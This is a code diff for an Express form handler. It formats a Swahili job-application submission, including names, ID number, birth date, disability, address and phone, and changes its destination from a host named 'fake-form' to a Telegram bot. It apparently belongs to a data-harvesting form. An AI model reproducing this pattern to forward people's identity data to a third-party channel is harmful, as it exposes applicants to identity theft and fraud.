@@ -30,21 +30,21 @@ app.post('/submit', async (req, res) => {
     try {
         const formData = req.body;
         const message = `
-    📄 Maombi Mapya:
-    Majina: ${formData.names}
-    Kitambulisho: ${formData.id_type} - ${formData.id_number}
-    Tarehe ya Kuzaliwa: ${formData.birth_day}/${formData.birth_month}/${formData.birth_year}
-    Hali ya Ndoa: ${formData.marital_status}
-    Dharura: ${formData.emergency_contact}
-    Kozi/Fani: ${formData.course}
-    Uzoefu wa kazi: ${formData.workplace}
-    Ulemavu: ${formData.disability} ${formData.disability_type ? `- ${formData.disability_type}` : ''}
-    Anuani: ${formData.address}
-    Simu: ${formData.phone}
-    Muda wa kazi: ${formData.years_job}
+📄 Maombi Mapya:
+Majina: ${formData.names}
+Kitambulisho: ${formData.id_type} - ${formData.id_number}
+Tarehe ya Kuzaliwa: ${formData.birth_day}/${formData.birth_month}/${formData.birth_year}
+Hali ya Ndoa: ${formData.marital_status}
+Dharura: ${formData.emergency_contact}
+Kozi/Fani: ${formData.course}
+Uzoefu wa kazi: ${formData.workplace}
+Ulemavu: ${formData.disability} ${formData.disability_type ? `- ${formData.disability_type}` : ''}
+Anuani: ${formData.address}
+Simu: ${formData.phone}
+Muda wa kazi: ${formData.years_job}
         `;
 
-        await fetch('https://fake-form-qc0f.onrender.com/', {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
